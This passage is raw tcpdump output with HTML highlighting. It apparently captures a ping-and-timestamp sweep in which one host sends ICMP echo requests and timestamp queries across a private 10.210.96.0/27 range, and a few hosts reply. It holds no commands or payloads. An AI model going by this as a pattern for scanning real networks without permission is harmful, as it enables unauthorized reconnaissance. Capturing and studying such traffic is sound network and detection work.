 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205923</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.7</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">54339</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205930</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.8</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">662</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205934</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.9</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">44505</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.205940</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.10</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">53250</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.207182</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.1</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>: ICMP echo reply, <span class="keyword">id</span> <span class="number">15450</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.207295</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.13</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">2073</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.207305</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.14</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">4397</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.209792</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.13</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>: ICMP echo reply, <span class="keyword">id</span> <span class="number">2073</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.209912</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.17</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">19920</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.209922</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.18</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">34999</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.306658</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.21</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">29270</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.306681</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.22</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">7671</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.306689</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.23</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">9104</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.306696</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.24</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">81</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.306704</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.25</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">32155</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.306712</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.26</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">63858</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.306720</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.27</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">26777</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.306727</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.28</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">13494</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.306733</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.29</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">44984</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.308869</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.0</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">17227</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.310989</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.11</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">34317</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.311005</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.12</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">61365</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.406811</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.16</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">55350</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.406822</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.19</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">35677</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.406828</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.20</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">65464</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.406835</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.30</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">15331</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.406840</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.31</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">29903</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">07.406864</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.15</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">9883</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.307498</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.2</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">62949</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.307516</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.3</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">12243</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.307524</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.4</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">31452</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.307532</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.5</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">31537</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.307540</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.6</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">54651</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.307549</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.7</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">50610</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.307559</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.8</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">62664</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.307569</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.9</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">13459</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.307578</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.10</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">62077</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.407677</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.14</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">55829</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.407686</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.17</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">53285</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.407691</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.18</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">21378</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.407696</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.21</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">23904</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.407701</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.22</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">64314</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.407707</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.23</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">27486</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.407712</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.24</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">20894</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.407717</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.25</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">32853</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.407722</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.26</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">45739</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.507898</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.13</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">11633</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.507952</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.0</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">11677</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.507991</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.15</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">42356</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.507996</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.16</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">49147</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.508006</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.20</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">57762</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.508014</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.27</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">10613</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.508768</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.13</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>: ICMP echo reply, <span class="keyword">id</span> <span class="number">11633</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.508823</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.11</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">61920</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.508830</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.12</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">46304</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.508835</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.19</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">49607</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.508840</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.28</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">1352</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.508844</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.29</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">46670</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.508860</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.30</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">53472</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.508863</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.31</span>: ICMP echo request, <span class="keyword">id</span> <span class="number">58278</span>, seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">8</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.508985</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.19</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">26454</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.511101</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.30</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">49439</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.511108</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.31</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">20408</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.511113</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.0</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">47435</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.511132</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.5</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">44739</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.511138</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.6</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">62544</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.511142</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.7</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">60818</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.511153</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.11</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">8734</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.511157</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.12</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">42535</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.608151</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.17</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">4191</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.608157</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.18</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">60313</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.608161</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.20</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">30447</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.608165</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.21</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">34293</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.608169</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.22</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">45789</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.608172</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.23</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">20615</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.608175</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.24</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">39416</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.608178</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.25</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">43274</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.610367</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.19</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">37423</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.610545</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.2</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">8441</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.610552</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.3</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">3578</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.610557</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.4</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">3637</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
 <span class="number">19</span>:<span class="number">29</span>:<span class="number">08.610560</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.8</span>: ICMP <span class="keyword">time</span> stamp <span class="keyword">query</span> <span class="keyword">id</span> <span class="number">21670</span> seq <span class="number">0</span>, <span class="keyword">length</span> <span class="number">20</span>
